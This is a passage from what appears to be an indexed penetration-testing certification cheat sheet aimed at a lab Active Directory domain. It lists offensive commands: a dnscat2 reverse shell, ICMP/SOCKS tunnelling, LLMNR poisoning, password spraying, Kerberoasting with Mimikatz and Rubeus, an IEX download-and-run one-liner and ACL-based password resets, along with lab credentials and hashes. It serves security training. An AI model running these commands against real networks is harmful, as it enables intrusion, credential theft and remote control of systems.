dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain\u00a0<code>inlanefreight.local</code>\u00a0with the no-cache option enabled. <code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code> Clones the dnscat2-powershell project Github repository. <code>Import-Module dnscat2.ps1</code> PowerShell command used to import the dnscat2.ps1 tool. <code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code> PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>). <code>dnscat2&gt; ?</code> Used to list dnscat2 options. <code>dnscat2&gt; window -i 1</code> Used to interact with an established dnscat2 session. <code>./chisel server -v -p 1234 --socks5</code> Used to start a chisel server in verbose mode listening on port\u00a0<code>1234</code>\u00a0using SOCKS version 5. <code>./chisel client -v 10.129.202.64:1234 socks</code> Used to connect to a chisel server at the specified IP address &amp; port using socks. <code>git clone https://github.com/utoni/ptunnel-ng.git</code> Clones the ptunnel-ng project GitHub repository. <code>sudo ./autogen.sh</code> Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. <code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code> Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>). <code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code> Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>). <code>ssh -p2222 -lubuntu 127.0.0.1</code> SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. <code>regsvr32.exe SocksOverRDP-Plugin.dll</code> Windows-based command used to register the SocksOverRDP-PLugin.dll. <code>netstat -antb \\|findstr 1080</code> Windows-based command used to list TCP network connections listening on port 1080.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#active-directory","title":"Active directory","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#initial-enumeration","title":"Initial Enumeration","text":"Command Description <code>nslookup ns1.inlanefreight.com</code> Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. <code>sudo tcpdump -i ens224</code> Used to start capturing network packets on the network interface proceeding the\u00a0<code>-i</code>\u00a0option a Linux-based host. <code>sudo responder -I ens224 -A</code> Used to start responding to &amp; analyzing\u00a0<code>LLMNR</code>,\u00a0<code>NBT-NS</code>\u00a0and\u00a0<code>MDNS</code>\u00a0queries on the interface specified proceeding the\u00a0<code>-I</code>\u00a0option and operating in\u00a0<code>Passive Analysis</code>\u00a0mode which is activated using\u00a0<code>-A</code>. Performed from a Linux-based host <code>fping -asgq 172.16.5.0/23</code> Performs a ping sweep on the specified network segment from a Linux-based host. <code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code> Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding\u00a0<code>-iL</code>. Then outputs the scan results to the file specified after the\u00a0<code>-oN</code>option. Performed from a Linux-based host <code>sudo git clone https://github.com/ropnop/kerbrute.git</code> Uses\u00a0<code>git</code>\u00a0to clone the kerbrute tool from a Linux-based host. <code>make help</code> Used to list compiling options that are possible with\u00a0<code>make</code>\u00a0from a Linux-based host. <code>sudo make all</code> Used to compile a\u00a0<code>Kerbrute</code>\u00a0binary for multiple OS platforms and CPU architectures. <code>./kerbrute_linux_amd64</code> Used to test the chosen complied\u00a0<code>Kebrute</code>\u00a0binary from a Linux-based host. <code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code> Used to move the\u00a0<code>Kerbrute</code>\u00a0binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. <code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code> Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the\u00a0<code>-d</code>\u00a0option and the associated domain controller specified proceeding\u00a0<code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#llmnrntb-ns-poisoning","title":"LLMNR/NTB-NS Poisoning","text":"Command Description <code>responder -h</code> Used to display the usage instructions and various options available in\u00a0<code>Responder</code>\u00a0from a Linux-based host. <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code> Uses\u00a0<code>hashcat</code>\u00a0to crack\u00a0<code>NTLMv2</code>\u00a0(<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist. <code>Import-Module .\\Inveigh.ps1</code> Using the\u00a0<code>Import-Module</code>\u00a0PowerShell cmd-let to import the Windows-based tool\u00a0<code>Inveigh.ps1</code>. <code>(Get-Command Invoke-Inveigh).Parameters</code> Used to output many of the options &amp; functionality available with\u00a0<code>Invoke-Inveigh</code>. Peformed from a Windows-based host. <code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code> Starts\u00a0<code>Inveigh</code>\u00a0on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file. <code>.\\Inveigh.exe</code> Starts the\u00a0<code>C#</code>\u00a0implementation of\u00a0<code>Inveigh</code>\u00a0from a Windows-based host. <code>$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey \\|foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}</code> PowerShell script used to disable NBT-NS on a Windows host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#password-spraying-password-policies","title":"Password Spraying &amp; Password Policies","text":"Command Description <code>#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done</code> Bash script used to generate\u00a0<code>16,079,616</code>\u00a0possible username combinations from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code> Uses\u00a0<code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5</code> Uses\u00a0<code>rpcclient</code>\u00a0to discover information about the domain through\u00a0<code>SMB NULL</code>\u00a0sessions. Performed from a Linux-based host. <code>rpcclient $&gt; querydominfo</code> Uses\u00a0<code>rpcclient</code>\u00a0to enumerate the password policy in a target Windows domain from a Linux-based host. <code>enum4linux -P 172.16.5.5</code> Uses\u00a0<code>enum4linux</code>\u00a0to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host. <code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code> Uses\u00a0<code>enum4linux-ng</code>\u00a0to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the\u00a0<code>-oA</code>\u00a0option. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" \\| grep -m 1 -B 10 pwdHistoryLength</code> Uses\u00a0<code>ldapsearch</code>\u00a0to enumerate the password policy in a target Windows domain from a Linux-based host. <code>net accounts</code> Used to enumerate the password policy in a Windows domain from a Windows-based host. <code>Import-Module .\\PowerView.ps1</code> Uses the Import-Module cmd-let to import the\u00a0<code>PowerView.ps1</code>\u00a0tool from a Windows-based host. <code>Get-DomainPolicy</code> Used to enumerate the password policy in a target Windows domain from a Windows-based host. <code>enum4linux -U 172.16.5.5 \\| grep \"user:\" \\| cut -f2 -d\"[\" \\| cut -f1 -d\"]\"</code> Uses\u00a0<code>enum4linux</code>\u00a0to discover user accounts in a target Windows domain, then leverages\u00a0<code>grep</code>\u00a0to filter the output to just display the user from a Linux-based host. <code>rpcclient -U \"\" -N 172.16.5.5 rpcclient $&gt; enumdomuser</code> Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. <code>crackmapexec smb 172.16.5.5 --users</code> Uses\u00a0<code>CrackMapExec</code>\u00a0to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host. <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\" \\| grep sAMAccountName: \\| cut -f2 -d\" \"</code> Uses\u00a0<code>ldapsearch</code>\u00a0to discover users in a target Windows doman, then filters the output using\u00a0<code>grep</code>\u00a0to show only the\u00a0<code>sAMAccountName</code>\u00a0from a Linux-based host. <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code> Uses the python tool\u00a0<code>windapsearch.py</code>\u00a0to discover users in a target Windows domain from a Linux-based host. <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 \\| grep Authority; done</code> Bash one-liner used to perform a password spraying attack using\u00a0<code>rpcclient</code>\u00a0and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner. <code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1</code> Uses\u00a0<code>kerbrute</code>\u00a0and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \\| grep +</code> Uses\u00a0<code>CrackMapExec</code>\u00a0and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using\u00a0<code>grep</code>. <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code> Uses\u00a0<code>CrackMapExec</code>\u00a0to validate a set of credentials from a Linux-based host. <code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \\| grep +</code> Uses\u00a0<code>CrackMapExec</code>\u00a0and the -<code>-local-auth</code>\u00a0flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using\u00a0<code>grep</code>. <code>Import-Module .\\DomainPasswordSpray.ps1</code> Used to import the PowerShell-based tool\u00a0<code>DomainPasswordSpray.ps1</code>\u00a0from a Windows-based host. <code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code> Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#enumerating-security-controls","title":"Enumerating Security Controls","text":"Command Description <code>Get-MpComputerStatus</code> PowerShell cmd-let used to check the status of\u00a0<code>Windows Defender Anti-Virus</code>\u00a0from a Windows-based host. <code>Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections</code> PowerShell cmd-let used to view\u00a0<code>AppLocker</code>\u00a0policies from a Windows-based host. <code>$ExecutionContext.SessionState.LanguageMode</code> PowerShell script used to discover the\u00a0<code>PowerShell Language Mode</code>\u00a0being used on a Windows-based host. Performed from a Windows-based host. <code>Find-LAPSDelegatedGroups</code> A\u00a0<code>LAPSToolkit</code>\u00a0function that discovers\u00a0<code>LAPS Delegated Groups</code>\u00a0from a Windows-based host. <code>Find-AdmPwdExtendedRights</code> A\u00a0<code>LAPSTookit</code>\u00a0function that checks the rights on each computer with LAPS enabled for any groups with read access and users with\u00a0<code>All Extended Rights</code>. Performed from a Windows-based host. <code>Get-LAPSComputers</code> A\u00a0<code>LAPSToolkit</code>\u00a0function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#credentialed-enumeration","title":"Credentialed Enumeration","text":"Command Description <code>xfreerdp /u:forend@inlanefreight.local\u00a0/p:Klmcargo2 /v:172.16.5.25</code> Connects to a Windows target using valid credentials. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code> Authenticates with a Windows target over\u00a0<code>smb</code>\u00a0using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code> Authenticates with a Windows target over\u00a0<code>smb</code>\u00a0using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code> Authenticates with a Windows target over\u00a0<code>smb</code>\u00a0using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code> Authenticates with a Windows target over\u00a0<code>smb</code>\u00a0using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host. <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code> Authenticates with a Windows target over\u00a0<code>smb</code>\u00a0using valid credentials and utilizes the CrackMapExec module (<code>-M</code>)\u00a0<code>spider_plus</code>\u00a0to go through each readable share (<code>Dev-share</code>) and list all readable files. The results are outputted in\u00a0<code>JSON</code>. Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code> Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host. <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code> Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host. <code>rpcclient $&gt; queryuser 0x457</code> Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host. <code>rpcclient $&gt; enumdomusers</code> Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host. <code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code> Impacket tool used to connect to the\u00a0<code>CLI</code>\u00a0of a Windows target via the\u00a0<code>ADMIN$</code>\u00a0administrative share with valid credentials. Performed from a Linux-based host. <code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code> Impacket tool used to connect to the\u00a0<code>CLI</code>\u00a0of a Windows target via\u00a0<code>WMI</code>\u00a0with valid credentials. Performed from a Linux-based host. <code>windapsearch.py -h</code> Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p transporter@4 --da</code> Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p transporter@4 -PU</code> Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host. <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code> Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>) as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#enumeration-by-living-off-the-land","title":"Enumeration by Living Off the Land","text":"Command Description <code>Get-Module</code> PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. <code>Import-Module ActiveDirectory</code> Loads the\u00a0<code>Active Directory</code>\u00a0PowerShell module from a Windows-based host. <code>Get-ADDomain</code> PowerShell cmd-let used to gather Windows domain information from a Windows-based host. <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code> PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by\u00a0<code>ServicePrincipalName</code>. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host. <code>Get-ADGroup -Filter * \\| select name</code> PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host. <code>Get-ADGroup -Identity \"Backup Operators\"</code> PowerShell cmd-let used to search for a specifc group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Get-ADGroupMember -Identity \"Backup Operators\"</code> PowerShell cmd-let used to discover the members of a specific group (<code>-Identity \"Backup Operators\"</code>). Performed from a Windows-based host. <code>Export-PowerViewCSV</code> PowerView script used to append results to a\u00a0<code>CSV</code>\u00a0file. Performed from a Windows-based host. <code>ConvertTo-SID</code> PowerView script used to convert a\u00a0<code>User</code>\u00a0or\u00a0<code>Group</code>\u00a0name to it's\u00a0<code>SID</code>. Performed from a Windows-based host. <code>Get-DomainSPNTicket</code> PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host. <code>Get-Domain</code> PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainController</code> PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. <code>Get-DomainUser</code> PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. <code>Get-DomainComputer</code> PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. <code>Get-DomainGroup</code> PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. <code>Get-DomainOU</code> PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. <code>Find-InterestingDomainAcl</code> PowerView script used to find object\u00a0<code>ACLs</code>\u00a0in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. <code>Get-DomainGroupMember</code> PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. <code>Get-DomainFileServer</code> PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. <code>Get-DomainDFSShare</code> PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. <code>Get-DomainGPO</code> PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. <code>Get-DomainPolicy</code> PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. <code>Get-NetLocalGroup</code> PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host. <code>Get-NetLocalGroupMember</code> PowerView script enumerate members of a specific local group. Performed from a Windows-based host. <code>Get-NetShare</code> PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. <code>Get-NetSession</code> PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. <code>Test-AdminAccess</code> PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. <code>Find-DomainUserLocation</code> PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. <code>Find-DomainShare</code> PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. <code>Find-InterestingDomainShareFile</code> PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. <code>Find-LocalAdminAccess</code> PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. <code>Get-ForestTrust</code> PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. <code>Get-DomainForeignUser</code> PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. <code>Get-DomainForeignGroupMember</code> PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse</code> PowerView script used to list all the members of a target group (<code>\"Domain Admins\"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host. <code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code> PowerView script used to find users on the target Windows domain that have the\u00a0<code>Service Principal Name</code>\u00a0set. Performed from a Windows-based host. <code>.\\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data</code> Runs a tool called\u00a0<code>Snaffler</code>\u00a0against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#transfering-files","title":"Transfering Files","text":"Command Description <code>sudo python3 -m http.server 8001</code> Starts a python web server for quick hosting of files. Performed from a Linux-basd host. <code>\"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')\"</code> PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. <code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code> Starts a impacket\u00a0<code>SMB</code>\u00a0server for quick hosting of a file. Performed from a Windows-based host.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#kerberoasting","title":"Kerberoasting","text":"Command Description <code>sudo python3 -m pip install .</code> Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. <code>GetUserSPNs.py -h</code> Impacket tool used to display the options and functionality of\u00a0<code>GetUserSPNs.py</code>\u00a0from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code> Impacket tool used to get a list of\u00a0<code>SPNs</code>\u00a0on the target Windows domain from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code> Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code> Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code> Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host. <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code> Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using\u00a0<code>hashcat</code>\u00a0and a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>setspn.exe -Q */*</code> Used to enumerate\u00a0<code>SPNs</code>\u00a0in a target Windows domain from a Windows-based host. <code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"</code> PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. <code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \\| Select-String '^CN' -Context 0,1 \\| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code> Used to download/request all TGS tickets from a WIndows-based host. <code>mimikatz # base64 /out:true</code> <code>Mimikatz</code>\u00a0command that ensures TGS tickets are extracted in\u00a0<code>base64</code>\u00a0format from a Windows-based host. <code>kerberos::list /export</code> <code>Mimikatz</code>\u00a0command used to extract the TGS tickets from a Windows-based host. <code>echo \"&lt;base64 blob&gt;\" \\| tr -d \\\\n</code> Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. <code>cat encoded_file \\| base64 -d &gt; sqldev.kirbi</code> Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host. <code>python2.7 kirbi2john.py sqldev.kirbi</code> Used to extract the\u00a0<code>Kerberos ticket</code>. This also creates a file called\u00a0<code>crack_file</code>\u00a0from a Linux-based host. <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code> Used to modify the\u00a0<code>crack_file</code>\u00a0for\u00a0<code>Hashcat</code>\u00a0from a Linux-based host. <code>cat sqldev_tgs_hashcat</code> Used to view the prepared hash from a Linux-based host. <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code> Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>Import-Module .\\PowerView.ps1 Get-DomainUser * -spn \\| select samaccountname</code> Uses PowerView tool to extract\u00a0<code>TGS Tickets</code>\u00a0. Performed from a Windows-based host. <code>Get-DomainUser -Identity sqldev \\| Get-DomainSPNTicket -Format Hashcat</code> PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for\u00a0<code>Hashcat</code>\u00a0from a Windows-based host. <code>Get-DomainUser * -SPN \\| Get-DomainSPNTicket -Format Hashcat \\| Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code> Exports all TGS tickets to a\u00a0<code>.CSV</code>\u00a0file (<code>ilfreight_tgs.csv</code>) from a Windows-based host. <code>cat .\\ilfreight_tgs.csv</code> Used to view the contents of the .csv file from a Windows-based host. <code>.\\Rubeus.exe</code> Used to view the options and functionality possible with the tool\u00a0<code>Rubeus</code>. Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /stats</code> Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host. <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code> Used to request/download TGS tickets for accounts with the\u00a0<code>admin</code>\u00a0count set to\u00a0<code>1</code>\u00a0then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code> Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host. <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code> PowerView tool used to check the\u00a0<code>msDS-SupportedEncryptionType</code>\u00a0attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host. <code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code> Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#acl-enumeration-tactics","title":"ACL Enumeration &amp; Tactics","text":"Command Description <code>Find-InterestingDomainAcl</code> PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. <code>Import-Module .\\PowerView.ps1 $sid = Convert-NameToSid wley</code> Used to import PowerView and retrieve the\u00a0<code>SID</code>\u00a0of a specific user account (<code>wley</code>) from a Windows-based host. <code>Get-DomainObjectACL -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to find all Windows domain objects that the user has rights over by mapping the user's\u00a0<code>SID</code>\u00a0to the\u00a0<code>SecurityIdentifier</code>\u00a0property from a Windows-based host. <code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\" Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \\| Select Name,DisplayName,DistinguishedName,rightsGuid \\| ?{$_.rightsGuid -eq $guid} \\| fl</code> Used to perform a reverse search &amp; map to a\u00a0<code>GUID</code>\u00a0value from a Windows-based host. <code>Get-DomainObjectACL -ResolveGUIDs -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host. <code>Get-ADUser -Filter * \\| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code> Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host. <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl \"AD:\\$(Get-ADUser $line)\" \\| Select-Object Path -ExpandProperty Access \\| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}</code> A\u00a0<code>foreach loop</code>\u00a0used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the\u00a0<code>Get-ADUser</code>\u00a0cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. <code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)</code> Used to create a\u00a0<code>PSCredential Object</code>\u00a0from a Windows-based host. <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code> Used to create a\u00a0<code>SecureString Object</code>\u00a0from a Windows-based host. <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code> PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host. <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * \\| Select -ExpandProperty Members</code> PowerView tool used view the members of a target security group (<code>Help Desk Level 